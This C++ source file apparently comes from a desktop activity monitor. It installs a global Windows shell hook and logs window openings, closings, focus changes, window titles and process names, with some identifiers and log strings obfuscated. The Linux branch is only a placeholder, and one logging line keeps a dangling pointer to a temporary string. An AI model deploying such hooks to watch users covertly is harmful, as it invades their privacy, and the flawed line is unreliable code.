#include "hooks/SystemHook.h"
#include "data/DataManager.h"
#include "core/Logger.h"
#include "utils/TimeUtils.h"
#include "utils/StringUtils.h"
#include "security/Obfuscation.h"

#if PLATFORM_WINDOWS
#include <Windows.h>
#include <psapi.h>
#elif PLATFORM_LINUX
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>
#include <pthread.h>
#include <unistd.h>
#endif

#include <string>
#include <vector>
#include <cstdint>

// Use const char* instead of constexpr std::string for obfuscated strings
const std::string OBF_SYSTEMHOOK_MODULE = OBFUSCATE("SystemHook");
const std::string OBF_FOCUSLOG_FORMAT = OBFUSCATE("FocusChange: { gained: %s, lost: %s }");

// Static member initialization
#if PLATFORM_WINDOWS
HHOOK hooks::SystemHook::s_systemHook = nullptr;
#endif
hooks::SystemHook* hooks::SystemHook::s_instance = nullptr;

namespace hooks {

SystemHook::SystemHook(DataManager* dataManager)
    : m_dataManager(dataManager), m_isActive(false) {
    s_instance = this;
}

SystemHook::~SystemHook() {
    RemoveHook();
    s_instance = nullptr;
}

bool SystemHook::InstallHook() {
    if (m_isActive) {
        return true;
    }

#if PLATFORM_WINDOWS
    s_systemHook = SetWindowsHookExW(
        WH_SHELL,
        ShellProc,
        GetModuleHandleW(NULL),
        0
    );

    if (!s_systemHook) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to install system hook. Error: " + std::to_string(error));
        return false;
    }
#elif PLATFORM_LINUX
    // Linux implementation using X11 event monitoring
    // This is a simplified approach - in production you'd want a more robust solution
    LOG_INFO("System hook not fully implemented for Linux. Window events will not be captured.");
    // For Linux, we could create a thread to monitor X11 events
#endif

    m_isActive = true;
    LOG_INFO("System hook installed successfully");
    return true;
}

bool SystemHook::RemoveHook() {
    if (!m_isActive) return true;

#if PLATFORM_WINDOWS
    if (s_systemHook && !UnhookWindowsHookEx(s_systemHook)) {
        DWORD error = GetLastError();
        LOG_ERROR("Failed to remove system hook. Error: " + std::to_string(error));
        return false;
    }
    s_systemHook = nullptr;
#elif PLATFORM_LINUX
    // Clean up Linux resources if any
#endif

    m_isActive = false;
    LOG_INFO("System hook removed successfully");
    return true;
}

#if PLATFORM_WINDOWS
LRESULT CALLBACK SystemHook::ShellProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= HC_ACTION && s_instance) {
        s_instance->ProcessShellEvent(wParam, lParam);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SystemHook::ProcessShellEvent(WPARAM eventType, LPARAM lParam) {
    try {
        switch (eventType) {
            case HSHELL_WINDOWCREATED:
                HandleWindowCreated(reinterpret_cast<HWND>(lParam));
                break;
            case HSHELL_WINDOWDESTROYED:
                HandleWindowDestroyed(reinterpret_cast<HWND>(lParam));
                break;
            case HSHELL_ACTIVATESHELLWINDOW:
                HandleShellActivated();
                break;
            case HSHELL_RUDEAPPACTIVATED:
                HandleAppActivated(reinterpret_cast<HWND>(lParam));
                break;
            default:
                break;
        }
    }
    catch (const std::exception& e) {
        LOG_ERROR(std::string("Error processing system event: ") + e.what());
    }
}

void SystemHook::HandleWindowCreated(HWND hwnd) {
    if (!hwnd || !IsWindowVisible(hwnd)) return;

    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventData::EventType::WINDOW_OPEN;
    eventData.windowHandle = reinterpret_cast<uint64_t>(hwnd);
    eventData.windowTitle = GetWindowTitle(hwnd);
    eventData.processName = GetProcessName(hwnd);

    m_dataManager->AddSystemEventData(eventData);
    LOG_DEBUG("Window created: " + eventData.windowTitle);
}

void SystemHook::HandleWindowDestroyed(HWND hwnd) {
    if (!hwnd) return;

    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventData::EventType::WINDOW_CLOSE;
    eventData.windowHandle = reinterpret_cast<uint64_t>(hwnd);
    eventData.windowTitle = GetWindowTitle(hwnd);
    eventData.processName = GetProcessName(hwnd);

    m_dataManager->AddSystemEventData(eventData);
    LOG_DEBUG("Window destroyed: " + eventData.windowTitle);
}

void SystemHook::HandleAppActivated(HWND hwnd) {
    if (!hwnd) return;

    static HWND s_lastActiveWindow = nullptr;
    if (s_lastActiveWindow == hwnd) return;

    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventData::EventType::WINDOW_OPEN;
    eventData.windowHandle = reinterpret_cast<uint64_t>(hwnd);
    eventData.windowTitle = GetWindowTitle(hwnd);
    eventData.processName = GetProcessName(hwnd);

    // Record previous active window if available
    if (s_lastActiveWindow) {
        eventData.extraInfo = "Previous: " + GetWindowTitle(s_lastActiveWindow);
    }

    m_dataManager->AddSystemEventData(eventData);

    char logMessage[512];
    const char* previousTitle = s_lastActiveWindow ? GetWindowTitle(s_lastActiveWindow).c_str() : "None";
    snprintf(logMessage, sizeof(logMessage), OBF_FOCUSLOG_FORMAT.c_str(),
            eventData.windowTitle.c_str(), previousTitle);

    LOG_DEBUG(logMessage);
    s_lastActiveWindow = hwnd;
}

std::string SystemHook::GetWindowTitle(HWND hwnd) const {
    if (!hwnd) return "Unknown";
    
    wchar_t title[256];
    if (GetWindowTextW(hwnd, title, sizeof(title) / sizeof(wchar_t))) {
        return utils::StringUtils::WideToUtf8(title);
    }
    return "Unknown";
}

std::string SystemHook::GetProcessName(HWND hwnd) const {
    if (!hwnd) return "Unknown";
    
    DWORD processId;
    if (GetWindowThreadProcessId(hwnd, &processId)) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        if (hProcess) {
            wchar_t processName[MAX_PATH];
            DWORD size = sizeof(processName) / sizeof(wchar_t);
            if (QueryFullProcessImageNameW(hProcess, 0, processName, &size)) {
                CloseHandle(hProcess);
                std::wstring wideName(processName);
                std::string fileName = utils::StringUtils::WideToUtf8(
                    wideName.substr(wideName.find_last_of(L"\\") + 1));
                return fileName;
            }
            CloseHandle(hProcess);
        }
    }
    return "Unknown";
}
#endif // PLATFORM_WINDOWS

void SystemHook::HandleShellActivated() {
    SystemEventData eventData;
    eventData.timestamp = utils::TimeUtils::GetCurrentTimestamp();
    eventData.eventType = SystemEventData::EventType::SYSTEM_UNLOCK;

    m_dataManager->AddSystemEventData(eventData);
    LOG_DEBUG("Shell activated");
}

#if PLATFORM_LINUX
void* SystemHook::LinuxEventThread(void* context) {
    SystemHook* instance = static_cast<SystemHook*>(context);
    if (instance) {
        instance->LinuxEventLoop();
    }
    return nullptr;
}

void SystemHook::LinuxEventLoop() {
    // Placeholder for Linux X11 event monitoring   
    // In a real implementation, you would:
    // 1. Open X11 display connection
    // 2. Monitor for window creation/destruction events
    // 3. Monitor for focus change events
    
    LOG_INFO("Linux system event monitoring started (placeholder)");
    
    while (m_isActive) {
        // Use sleep function appropriate for the platform
        #if PLATFORM_WINDOWS
        Sleep(1000);
        #else
        sleep(1);
        #endif
    }
}
#endif // PLATFORM_LINUX

} // namespace hooks